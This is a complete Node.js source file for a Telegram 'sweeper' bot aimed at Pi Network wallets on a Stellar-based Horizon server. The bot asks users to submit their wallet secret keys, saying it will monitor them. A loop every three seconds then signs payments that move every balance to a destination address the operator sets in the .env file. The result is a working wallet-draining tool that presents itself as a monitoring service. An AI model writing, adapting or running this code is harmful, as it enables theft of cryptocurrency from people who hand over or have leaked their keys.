require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const StellarSdk = require('@stellar/stellar-sdk');

const token = process.env.TELEGRAM_BOT_TOKEN;
const HARDCODED_DESTINATION = process.env.DESTINATION_WALLET_ADDRESS;

if (!token) {
    console.error("❌ ERROR: TELEGRAM_BOT_TOKEN is missing in .env file.");
    process.exit(1);
}

if (!HARDCODED_DESTINATION) {
    console.error("❌ ERROR: DESTINATION_WALLET_ADDRESS is missing in .env file.");
    process.exit(1);
}

// Initialize the Telegram bot using polling
const bot = new TelegramBot(token, { polling: true });

// Initialize Stellar Server (Pi Network runs on Stellar-based architecture)
const server = new StellarSdk.Horizon.Server('https://horizon.pi-network.network');

// Network passphrase definition (Ensure this matches Pi's network ID if custom)
const PI_NETWORK_PASSPHRASE = StellarSdk.Networks.PUBLIC; 

// In-memory registry tracking monitored wallets
let activeMonitors = [];

console.log("==================================================");
console.log(" 🤖 TELEGRAM SWEEPER BOT INITIALIZED & LISTENING");
console.log(` Target Destination: ${HARDCODED_DESTINATION}`);
console.log("==================================================");

// Command: /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `⚡ *Pi Multi-Wallet Sweeper Bot Online*\n\n` +
        `Send your passphrases or keys to monitor them.\n` +
        `• Format: \`/add <your_private_key_or_secret>\`\n` +
        `• Check status: \`/status\``, 
        { parse_mode: "Markdown" }
    );
});

// Command: /add <passphrase or private key> with built-in validation & lookup
bot.onText(/\/add (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const passphraseOrKey = match[1].trim();

    try {
        const keypair = StellarSdk.Keypair.fromSecret(passphraseOrKey);
        const publicKey = keypair.publicKey();

        console.log(`🔑 Derived Public Key for input: ${publicKey}`);

        // Verify account on Horizon immediately upon adding
        try {
            const accountInfo = await server.loadAccount(publicKey);
            console.log(`✅ Account verified on Horizon! Balances found count:`, accountInfo.balances.length);
        } catch (horizonErr) {
            console.log(`⚠️ Horizon warning for ${publicKey}: ${horizonErr.message}`);
        }

        const exists = activeMonitors.find(w => w.publicKey === publicKey);
        if (exists) {
            return bot.sendMessage(chatId, `⚠️ This wallet is already being monitored.`);
        }

        const newEntry = {
            id: activeMonitors.length + 1,
            chatId: chatId,
            secret: passphraseOrKey,
            publicKey: publicKey,
            status: "Monitoring Active 🟢"
        };

        activeMonitors.push(newEntry);
        bot.sendMessage(chatId, 
            `✅ *Wallet Added Successfully!*\n\n` +
            `• *ID:* #${newEntry.id}\n` +
            `• *Address:* \`${publicKey}\`\n` +
            `• *Status:* Live monitoring active.`, 
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        console.error(`❌ Key derivation error:`, error.message);
        bot.sendMessage(chatId, `❌ Invalid passphrase or key format: ${error.message}`);
    }
});

// Command: /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const userWallets = activeMonitors.filter(w => w.chatId === chatId);

    if (userWallets.length === 0) {
        return bot.sendMessage(chatId, "📭 You have no active wallets in the monitoring queue.");
    }

    let response = "📊 *Your Monitored Wallets:*\n\n";
    userWallets.forEach(w => {
        response += `#${w.id} | \`${w.publicKey.substring(0, 10)}...\`\nStatus: *${w.status}*\n\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
});

// BACKGROUND MONITORING LOOP (Runs continuously every 3 seconds)
setInterval(async () => {
    if (activeMonitors.length === 0) return;

    for (let wallet of activeMonitors) {
        if (wallet.status.includes("Completed") || wallet.status.includes("Success")) continue;

        try {
            // Load account details from the Horizon server
            const account = await server.loadAccount(wallet.publicKey);
            
            // Check if there are any balances to sweep
            let operationsToAdd = [];

            for (const balance of account.balances) {
                let asset;
                let sendAmount = parseFloat(balance.balance);

                if (balance.asset_type === 'native') {
                    // For native asset, leave a tiny reserve (e.g., 0.001) for the transaction fee
                    const feeReserve = 0.001;
                    sendAmount = sendAmount - feeReserve;
                    asset = StellarSdk.Asset.native();
                } else {
                    // For any custom token/asset found in the wallet
                    asset = new StellarSdk.Asset(balance.asset_code, balance.asset_issuer);
                }

                // If there's a valid amount to send, add it as a payment operation
                if (sendAmount > 0) {
                    operationsToAdd.push({
                        asset: asset,
                        amount: sendAmount.toFixed(7)
                    });
                }
            }

            if (operationsToAdd.length > 0) {
                console.log(`🚨 Assets found for Wallet ID #${wallet.id} (${wallet.publicKey})! Sweeping...`);

                const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret);
                const sourceAccount = await server.loadAccount(wallet.publicKey);

                // Build a transaction that includes operations for every asset found
                let transactionBuilder = new StellarSdk.TransactionBuilder(sourceAccount, {
                    fee: StellarSdk.BASE_FEE,
                    networkPassphrase: PI_NETWORK_PASSPHRASE
                });

                operationsToAdd.forEach(op => {
                    transactionBuilder.addOperation(StellarSdk.Operation.payment({
                        destination: HARDCODED_DESTINATION,
                        asset: op.asset,
                        amount: op.amount,
                    }));
                });

                const transaction = transactionBuilder.setTimeout(30).build();
                transaction.sign(sourceKeypair);
                const transactionResponse = await server.submitTransaction(transaction);

                console.log(`✅ Success! Transaction hash: ${transactionResponse.hash}`);
                wallet.status = "Success - Swept ✅";

                // Instantly notify your Telegram phone app
                bot.sendMessage(wallet.chatId, 
                    `🚀 *SUCCESSFUL SWEEP!* \n\n` +
                    `All assets from wallet \`${wallet.publicKey.substring(0, 10)}...\` were automatically moved to your destination!\n` +
                    `TxHash: \`${transactionResponse.hash}\``, 
                    { parse_mode: "Markdown" }
                );
            }
        } catch (err) {
            // DETAILED ERROR LOGGING: Captures full server/network error responses for debugging
            const errorDetails = err.response?.data ? JSON.stringify(err.response.data) : (err.message || err);
            
            // Suppress 404 logs for accounts that haven't been funded on-chain yet
            if (!String(errorDetails).includes('404')) {
                console.error(`❌ ERROR processing wallet #${wallet.id} (${wallet.publicKey}):`, errorDetails);
            }
        }
    }
}, 3000);
